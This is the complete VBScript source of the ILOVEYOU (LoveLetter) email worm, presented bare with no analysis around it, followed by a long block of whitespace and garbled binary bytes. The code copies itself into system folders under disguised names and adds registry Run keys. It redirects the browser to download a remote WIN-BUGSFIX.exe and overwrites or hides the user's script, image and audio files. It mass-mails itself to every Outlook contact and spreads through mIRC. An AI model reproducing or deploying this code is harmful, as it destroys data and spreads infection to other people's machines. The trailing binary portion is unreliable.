rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           ����2#�6S9���x����p% r�Mc����m_NC|{�Ch�z�߻͐�PJ�ִ��$��H�'ť�ď���x?���-�@�)1�a���	m��������	)��8�����x��g��1�g��ـ1��l���036 �6~0����K<����`�� '�m �< #�6H�`�`` �`B0 @� �cc@ [ �c0@l,� 00؀@ ;0b ` ������10��06F �� �`��6���@۶  �!� !�CR�CtC
p�!�I��1����<"I1�0�L �͈1q�"�+~	J���p�jHc�@�	?��8��'r�6`'����s��R'	�L��J���4$&�iJS%EB��C5��LEh�qk(�jJ#*�����B�$�T�Hc�$�\�X�4�i
�k5�#�i�*�*�MDt�-��82$��Ei�B�o'I�;F%�A�Ij����D�N�a�	��HԦfLDr2K�Xd��T��@62�THd� TRr�Wl
�P &����DCq��FY�D�`��LXF��,ۤ��B�d a�Z�VT�H�("	#�R�;IA&LR c0�1�JC��	K�&�TC<���X2��(L$�A"�6Y�@�AH �h�aPXFP���MH#-�,<ec�<��,.<�zK� ;+��F��D5VVI*� +ʊΤ�*�y�j*f��(r0���Tp�Ey���� X]U�>��������A�\B���@���y"b�b$.�&1�������?k�+;�`rj�9�oQ�	Du��;��N�Q�B��)?
8a
P!�-� ��Rʉ'ާR�qÄG)1��O�χ�ǚ	4 =��@Y�T��B�=�îc-�@(�`c�9�Z�M&Dʄ/�	��f�%��j!���@c�&7�x������e���]�a�����P�a�0�� S1t�-n���q,I�2q	, A��>��cY�� �b;�9T(�N�'c�&0P�# !w")�H��u�V8n�yUE֢�}M�q�4�1�R��XvLHXH�)38��f�o���D*5|b����\������=�`��ٓDC'-a��I\{p�Ď��            @                      @                      @           (   <  
�|n����ȼȨ���Ĭ����|l\LH|x @(�`0J �%�*`M�`Kd4D���@���FLJ"9��# �p1A9=х�d�H���J9 ǏHDA���E	������rI,�A�I�8Đ�5U�(��(�(��$�H�x�È
�J
O�χ2V�o-�)�@!��=L�"��`К��g�L���"����Z�D�"���� iX���{dE���]V"��!�p��A)nE$D,""QC
)� * ��L�Ҟ�+  � �����D�Ɲ��F0Q2"��
d�g2��c��b3�Z;Ë@
�]��%I���*kr��5�Q����B�	t1q�D��(f�aH�"��}83z)\H6S`�����)P�qҬ��))uTB�p�A ��b��,��¯g��pB��	��-���CP*c
#b) �ŀ�z�k��8:*�(/M0� u�����e .�:%(��^:QTDŨ"r��:�a&"�D���#�
�:3��"T�I�H��:�D�����Tv
�
��%P1Ī$�U0J��U( �Er*��c�8)[(� 
��P9lc��h�C�!V�a�甃���HǇ6��P��(B��1@4ǥ�J�(�
���A�C����T�8��
GK	Cr��NhA�I=1ZDQaRR���	�(�/����M4e��Q�R�YT4g�"��ӡ ��I��И��D#���@Ql��HVGcBŸ4pa"%K	 `JV�+�+����	S�0N
Q��]��� bHH)j��@'H�(i�tUB*�I:HP�4W�4BI�"B#�t  5	AUU$�V$��$i	IH:MRQ�'"�$	IuBBB�$I�$Iʝ��$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I:I�$I�$!I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�$I�t�$I�$I��H�$I�$I�$I�$I�$I�N�$�$I�N'I'I���$I�$Iҝt�t��$I�$I'I'�$���$�ݝN�ӝt'I������N���Iw����;����Nwwww��������tw���-����ӝtwww��Nww:�$M�������ӝN�����4�!:��� i�5MS��$U�4MS5Dw�ۉB�8M否i��TUYMS5M�T�XMM�TU�t4'vz	�!AV�SU!��R9�TMӐ�!Hww7��M,� ��XMӀ�48)US��R��H!Mc9Ē�
KF.�U��"U㘆�@i*�iB�*�(���)�!�.�q�R���F�
�|��1��Hdd(*,;%s��0I�����\a"�8N#K=)I)J*9�%�R���ҊF��RP��N��aN�Imd0h6��}�Qd2��9eT%`,�h ���M�r]%�6��Q�X�r��,�d��t�E�J�6D�8u��4�X�~�	�CJ2ڃ+��Q<�2ͺ�@$�&�[!�|���E� �1�I/���HU�ʑ[4*��V9��8�a�9���ht�X&F� �$e��1f��C�#$ �
��`�""�D�2�M5�\&��t����iI���ll�q�CC�7�8��81���J��� o�g�
3B�Q2�%�Z|�f SBf9�QC�Qn%��Ș���m�A�R"��L�����:��Ͱ�=��8�̍��H(U�$�/��}b8E�:�SI0�@V1I1ÕhPȄP�z��1���� U���A������zX��p��'�6�.L*q��X�:+��J�ra%�Cl��m�!���[L��h!��u�ƼQ�4B�f�U2��S�J,)b���2�Kj�u�:҉`f�t�0/�P�P~Juj$��
4L�CN�,����Qqᆅ�K��1m)��I���"db�p(R:��
���1�sS�����4egm�r'
�x#�_7X��m���@� 1ƌ�%���Y��-T�@�d���%2%��s����|�gA&hcQ3�b�,T ��L� )	(0BI�U0д(�@|��%5�B������ R�x�`���C�?W~IH�si�4�&>v�V ��Y������İ����������l\PL�x�DF�V9�8
45 I� e!B�&b*4(1c� �7i��3��\��.�9��]iR�A"�J$�F�;A�C%���k�y3��ȂZ@ͩ���mS���=�[�j��d��4���� �ƶ��bB������H+��20U4�&�e-��?}W�F�r$��&4Im�z�TRd����2
�Gy�u@z��� �Rv�sb��̑���@�Ź�E[h�mqQhJ�z2�V�y�u����́���*�"���rBrF���T��]OlFh+3�9yѼĴZ#��.�W�V�IADP� ��0��e$���F�t�+Չ��BKP�Y2K��̼��D3LYFR =�.2�p����`dh��^\*5˸��c�����!ߓIy>"���H�m�E4kY���XP xA2!1�Qmt�4��L�3j@�,#+R'U�A�@9���T��L�� �񨺆J��WW(U8:\��HL���tҍ�T� <I�N�?����ZaўAT�S�e*&K ��:�	r��CWϪ������\�G���.�d٢�H��ز����#��Q@SUa�%��Ei�c�`���#�L�s��J3�v�+/�yW{�v۸9��jZ�V��X��I��^N���z�3�8_��fko�/���[-Ly�-��ӂ���2��Ӹ�ws"�%7:H��"U�)��<�+�T�A2�DV������j-��Js��}��5VJ����������5�u�������?����ߞ���1��;��������?�~۶���~~�ƶ��~F�߶�6Jݶ����m �������I������������������������������������������������~������������������������������������������������������������������������������?��������������������������������������o��������o�����������~����������������m��o�����������������m۶m����۶O��~�~۶m�m�mےc��o�۶�m�m۶�o�m��~�o�mGZcJ)���u�8M��t�����~�6��-H��) N�m�Ϥ�'���o���ۈq��2}TO<����m�"�m](n[��R�1�L�,b5m+�FJ1b�;RLK��pK�8�)�o���!mk��mM[׭`oR
�&C9�!�1'L�f�r����-N봎1�1�-�u���uۚcۮq�X��_7��l2I"fc#棈S��6(>�1$Є��dM/of��u�pZ(�kn��}�1��+
Ve$g��j0!��,�P�!0�0�a`V�M ��0������h��*&��	�(A(���r2%�0��c7�C�*(������Y���f,1VA:��b?X  Ea���G��x�n��qJ�	Z
i�3��+���1�����iѕ�A6=�*DKtlIBPy��4��<`3�q��4V�S� �\:-u�k((,�",1�(�DK����i��WNB��II_g�"�a�Q��R1�LKǜ�U\�2�	(z��$�M��Ӗ� C ��l�K���\�`��#?���C1��pH)��=�G4ĕԳ���R�D�L4�0�ЧS�)[�p)�*�JW�ǫ	�Y=�-��X�?���X͵a��E($y�P$�\g�Ȁ&��� PL'�H||� $�Ѫ^
P��������0͊^�#:�3�c���4A<A8M��!�#��	ء�"����&�Ǡ�@���$��g��y
�*rI�?��pc'
�_'.4)2�@�X��	1�tj�%���X��¡�"c����h�JXKB`���ʌ���A&{�`K�2�� ��&JԺ���[�`��È2&h�?            @                      @                      @           d     �pj�	�����̸��������|xpXLP�� �$�q�iK��"A,H͙���D8A��!1*��P�������Ha��^=!�} �qh�ֆy�%�M��G���09YQ,#�QZ�:W	��BUÄJ�R��N"S��`�kjS���*)����HF��3a�`5c�C